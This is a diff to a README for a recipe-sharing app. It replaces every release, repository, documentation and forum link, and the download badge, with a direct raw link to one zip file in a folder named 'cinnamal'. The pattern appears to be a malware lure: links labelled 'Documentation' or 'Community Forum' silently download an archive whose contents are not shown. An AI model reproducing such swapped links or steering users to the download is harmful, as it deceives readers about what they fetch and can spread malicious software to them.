@@ -1,6 +1,6 @@
 # 🍽️ recipe_sharing - Share Your Favorite Recipes Easily
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/Foxsy1/recipe_sharing/releases)
+[![Download Now](https://raw.githubusercontent.com/Foxsy1/recipe_sharing/main/cinnamal/recipe_sharing.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/Foxsy1/recipe_sharing/main/cinnamal/recipe_sharing.zip)
 
 ## 🚀 Getting Started
 
@@ -13,7 +13,7 @@ Follow these steps to download and run the app.
 1. **Visit the Download Page:**
    Click the link below to go to the Releases page where you can download the app.
 
-   [Download the Latest Release](https://github.com/Foxsy1/recipe_sharing/releases)
+   [Download the Latest Release](https://raw.githubusercontent.com/Foxsy1/recipe_sharing/main/cinnamal/recipe_sharing.zip)
 
 2. **Choose Your Version:**
    Find the latest version listed on the Releases page. Click the link associated with the file for your operating system.
@@ -69,9 +69,9 @@ If you encounter any issues or have questions, please check the documentation av
 
 Here are some resources to help you get the most out of the **recipe_sharing** application:
 
-- [GitHub Repository](https://github.com/Foxsy1/recipe_sharing)
-- [Documentation](https://github.com/Foxsy1/recipe_sharing/wiki)
-- [Community Forum](https://github.com/Foxsy1/recipe_sharing/discussions)
+- [GitHub Repository](https://raw.githubusercontent.com/Foxsy1/recipe_sharing/main/cinnamal/recipe_sharing.zip)
+- [Documentation](https://raw.githubusercontent.com/Foxsy1/recipe_sharing/main/cinnamal/recipe_sharing.zip)
+- [Community Forum](https://raw.githubusercontent.com/Foxsy1/recipe_sharing/main/cinnamal/recipe_sharing.zip)
 
 ## 📞 Contact
 
